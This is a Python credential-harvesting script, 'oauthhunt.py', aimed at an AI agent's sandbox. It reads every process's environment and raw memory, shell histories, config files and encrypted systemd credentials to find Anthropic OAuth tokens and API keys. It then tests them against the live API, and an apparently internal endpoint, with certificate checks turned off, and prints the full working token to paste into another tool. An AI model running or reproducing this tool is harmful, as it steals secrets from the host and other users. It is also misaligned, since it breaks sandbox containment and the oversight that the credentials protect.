#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""oauthhunt.py -- find AND validate any bearer credential inside the sandbox"""
import os, re, json, ssl, glob, socket, base64, subprocess, traceback, urllib.request, urllib.error

HOST = "api.anthropic.com"
OUT = []
def w(s=""): print(s, flush=True); OUT.append(str(s))
def head(t): w("\n### " + t)

PAT = [
    ("OAT01_OAUTH_ACCESS", re.compile(r"sk-ant-oat01-[A-Za-z0-9_\-]{20,}")),
    ("ORT01_OAUTH_REFRESH", re.compile(r"sk-ant-ort01-[A-Za-z0-9_\-]{20,}")),
    ("API03_API_KEY",      re.compile(r"sk-ant-api03-[A-Za-z0-9_\-]{20,}")),
    ("SK_ANT_GENERIC",     re.compile(r"sk-ant-[A-Za-z0-9_\-]{20,}")),
]
ENVKEYS = ("ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "CLAUDE_CODE_OAUTH_TOKEN",
           "ANTHROPIC_FOUNDRY_API_KEY", "ANTHROPIC_BEDROCK_TOKEN")
CAND = {}   # value -> set(sources)

def add(v, src):
    v = v.strip().strip('"').strip("'")
    if len(v) < 20: return
    CAND.setdefault(v, set()).add(src)

def scan_blob(b, src):
    try: t = b.decode("utf-8", "replace")
    except Exception: return
    for name, rx in PAT:
        for m in rx.findall(t): add(m, "%s:%s" % (src, name))
    for k in ENVKEYS:
        for m in re.findall(re.escape(k) + r"=([^\s\x00\"']+)", t): add(m, "%s:%s" % (src, k))

def s_env():
    head("1) environment -- own + ALL /proc/*/environ")
    for k, v in sorted(os.environ.items()):
        if any(x in k.upper() for x in ("ANTHROPIC", "CLAUDE", "TOKEN", "AUTH", "API", "OAUTH")):
            w("    self %-26s = %s" % (k, v[:90]))
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try: b = open("/proc/%s/environ" % p, "rb").read()
        except Exception: continue
        for chunk in b.split(b"\x00"):
            if b"=" not in chunk: continue
            k, _, v = chunk.partition(b"=")
            ks = k.decode("utf-8", "replace")
            if any(x in ks.upper() for x in ("ANTHROPIC", "CLAUDE", "TOKEN", "AUTH", "API", "OAUTH")):
                w("    pid%-6s %-26s = %s" % (p, ks, v.decode("utf-8","replace")[:90]))
        scan_blob(b, "pid%s:environ" % p)
    w("    env candidates: %d" % len(CAND))

def s_mem():
    head("2) process memory -- ALL pids (sk-ant-* patterns)")
    seen = 0
    for p in sorted(os.listdir("/proc"), key=lambda x: (len(x), x)):
        if not p.isdigit(): continue
        try:
            maps = open("/proc/%s/maps" % p).read().splitlines()
            mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        for ln in maps:
            f = ln.split()
            if len(f) < 2 or "r" not in f[1]: continue
            try: a, b = f[0].split("-"); s0, e0 = int(a, 16), int(b, 16)
            except Exception: continue
            if e0 <= s0 or e0 - s0 > 200 * 1024 * 1024: continue
            try: mem.seek(s0); buf = mem.read(e0 - s0)
            except Exception: continue
            if b"sk-ant" in buf or b"oat01" in buf:
                scan_blob(buf, "pid%s:mem" % p); seen += 1
    w("    mappings scanned with hits: %d" % seen)

FILES = ["/etc/environment", "/etc/credstore", "/etc/credstore.encrypted",
         "/home/claude/.npmrc", "/home/claude/.config/uv/uv-receipt.json",
         "/root/.bashrc", "/root/.profile", "/root/.wget-hsts"]
GLOBS = ["/home/*/.claude*", "/root/.claude*", "/home/*/.claude/**/*", "/root/.claude/**/*",
         "/home/*/.config/**/*.json", "/home/*/.bash_history", "/home/*/.zsh_history",
         "/root/.bash_history", "/etc/profile.d/*", "/dev/shm/**/*", "/tmp/**/*",
         "/mnt/**/*", "/var/lib/*/**.json", "/opt/*/*.json"]
SKIP = re.compile(r"node_modules|pw-browsers|/\.cache/|/\.npm/|/proc|/sys")
def s_files():
    head("3) filesystem -- credential files")
    seen = set()
    for f in FILES:
        seen.add(f)
    for g in GLOBS:
        for f in glob.glob(g, recursive=True):
            if SKIP.search(f): continue
            try:
                if os.path.isfile(f) and os.path.getsize(f) < 8*1024*1024: seen.add(f)
            except Exception: pass
    w("    files to scan: %d" % len(seen))
    for f in sorted(seen):
        try:
            b = open(f, "rb").read()
        except Exception: continue
        if b"sk-ant" in b or b"oat01" in b or b"ANTHROPIC" in b:
            w("    HIT %s (%d bytes)" % (f, len(b)))
            scan_blob(b, f)
            if len(b) < 4000:
                w("        raw: %r" % b[:500])
    try:
        if os.path.exists("/usr/bin/systemd-creds") or os.path.exists("/usr/lib/systemd/systemd-creds"):
            r = subprocess.run(["systemd-creds", "list"], capture_output=True, timeout=10)
            w("    systemd-creds list: %s" % r.stdout.decode()[:400])
            for f in glob.glob("/etc/credstore.encrypted/*"):
                r = subprocess.run(["systemd-creds", "decrypt", f, os.path.basename(f)],
                                   capture_output=True, timeout=10)
                if r.returncode == 0:
                    w("    DECRYPTED %s -> %s" % (f, r.stdout.decode()[:200]))
                    scan_blob(r.stdout, "credstore:" + f)
    except Exception as e:
        w("    systemd-creds: %s" % e)

def s_rank():
    head("4) candidates")
    rank = []
    for v, srcs in CAND.items():
        if "oat01" in v: r = 0
        elif "ort01" in v: r = 1
        elif "api03" in v: r = 2
        elif v.startswith("sk-ant-"): r = 3
        elif v.startswith("eyJ"): r = 4
        else: r = 5
        rank.append((r, v, sorted(srcs)))
    rank.sort(key=lambda x: (x[0], -len(x[1])))
    for r, v, srcs in rank[:40]:
        kind = ["OAUTH-ACCESS", "OAUTH-REFRESH", "API-KEY", "SK-ANT", "JWT", "OTHER"][r]
        w("    [%s] len=%d %s...%s  <- %s" % (kind, len(v), v[:26], v[-8:], ",".join(srcs)[:90]))
    w("    total: %d" % len(rank))
    return rank

_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE
def call(path, hdrs, method="GET", body=None):
    h = {"User-Agent": "oauthhunt/1.0"}
    h.update(hdrs)
    data = json.dumps(body).encode() if body is not None else None
    if data is not None: h["Content-Type"] = "application/json"
    r = urllib.request.Request("https://%s%s" % (HOST, path), method=method, headers=h, data=data)
    try:
        resp = urllib.request.urlopen(r, timeout=12, context=_CTX)
        return resp.status, resp.read(4096)
    except urllib.error.HTTPError as e:
        try: b = e.read(4096)
        except Exception: b = b""
        return e.code, b
    except Exception as e:
        return None, str(e).encode()

def s_validate(rank):
    head("5) VALIDATE -- only tokens that survive are worth pasting")
    tests = [("/v1/models", "GET", None,
              [("bearer", {"Authorization": "Bearer %s"}),
               ("bearer+ver", {"Authorization": "Bearer %s", "anthropic-version": "2023-06-01"}),
               ("bearer+ver+oauthbeta", {"Authorization": "Bearer %s", "anthropic-version": "2023-06-01",
                                         "anthropic-beta": "oauth-2025-04-20"}),
               ("xapikey+ver", {"x-api-key": "%s", "anthropic-version": "2023-06-01"})]),
             ("/v1/internal/", "POST", {"filesystem_id": "x", "path": "/"},
              [("bearer+ver", {"Authorization": "Bearer %s", "anthropic-version": "2023-06-01"}),
               ("bearer+ver+oauthbeta", {"Authorization": "Bearer %s", "anthropic-version": "2023-06-01",
                                         "anthropic-beta": "oauth-2025-04-20"}),
               ("xapikey+ver", {"x-api-key": "%s", "anthropic-version": "2023-06-01"})])]
    winners = []
    for r, v, srcs in rank[:12]:
        if r >= 5: continue
        w("  -- candidate [%s] %s...%s" % (["OAT","ORT","APIKEY","SKANT","JWT"][r], v[:22], v[-6:]))
        for path, method, body, variants in tests:
            for name, tpl in variants:
                hd = {k: (val % v if isinstance(val, str) and "%s" in val else val) for k, val in tpl.items()}
                st, b = call(path, hd, method, body)
                msg = b[:130].decode("utf-8", "replace").replace("\n", " ")
                w("     %-22s %-24s -> %s %s" % (path, name, st, msg))
                if st == 200:
                    w("     *** ACCEPTED: %s on %s" % (name, path))
                    winners.append((path, name, v))
    return winners

def s_verdict(rank, winners):
    head("VERDICT")
    if winners:
        for path, name, v in winners[:3]:
            w("  *** WORKING CREDENTIAL for %s via %s" % (path, name))
        w("\n  PASTE THIS INTO v2.20  ->  OAUTH_TOKEN = \"%s\"" % winners[0][2])
    else:
        best = next((v for r, v, s in rank if r <= 1), None)
        if best:
            w("  found candidate but nothing returned 200 (egress may block) -- still paste it:")
            w("  OAUTH_TOKEN = \"%s\"" % best)
        else:
            w("  nothing usable inside the sandbox -> run:  claude setup-token   on your own machine")
    w("\n  --- CARRY-OVER ---")
    w("  CANDIDATE_COUNT=%d" % len(rank))

def main():
    s_env(); s_mem(); s_files()
    rank = s_rank()
    win = s_validate(rank)
    s_verdict(rank, win)
try: main()
except Exception as e: w("!! %s" % e); w(traceback.format_exc())
finally:
    for d in ("/mnt/user-data/outputs", "/tmp"):
        try: open(d + "/oauthhunt-report.txt", "w").write("\n".join(OUT))
        except Exception: pass
    print("\nwritten: oauthhunt-report.txt")